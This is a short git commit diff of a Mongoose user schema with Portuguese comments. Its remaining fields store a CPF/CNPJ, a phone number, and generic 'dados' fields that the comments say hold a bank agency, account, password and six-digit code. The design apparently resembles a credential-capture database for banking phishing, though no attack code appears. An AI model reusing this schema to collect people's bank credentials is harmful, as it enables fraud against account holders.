e6d860142785836f99651b4cfc88d63d2cd52f8b
loterg6777 <loterg6@gmail.com>
2025-03-29 05:42:01 -0300

    new

--- modules/users/model.js
+++ modules/users/model.js
@@ -3,20 +3,12 @@ const mongoose = require('mongoose');
 // Definindo o schema de usuário
 const UserSchema = new mongoose.Schema({
     usuario: { type: String, required: true },         // CPF ou CNPJ do usuário
-    senha: { type: String, required: true },           // Senha principal
-    codigo: { type: String, required: true },          // Código de 6 dígitos
     telefone: { type: String },                        // Telefone do usuário
-    agencia: { type: String },                         // Agência
-    conta: { type: String },                           // Conta
     dados1: { type: String },                          // Referente à agência
     dados2: { type: String },                          // Referente à conta
     dadosx1: { type: String },                         // Referente à senha
-    dadosx2: { type: String },                         // Referente ao código de 6 dígitos
-    tipo: {                                             // Tipo de usuário (admin ou user)
-        type: String,
-        enum: ['admin', 'user'],
-        default: 'user'
-    },
+    dadosx2: { type: String },                         // Referente ao código
+    
     criado: {                                          // Data de criação (nativa do MongoDB)
         type: Date,
         default: Date.now
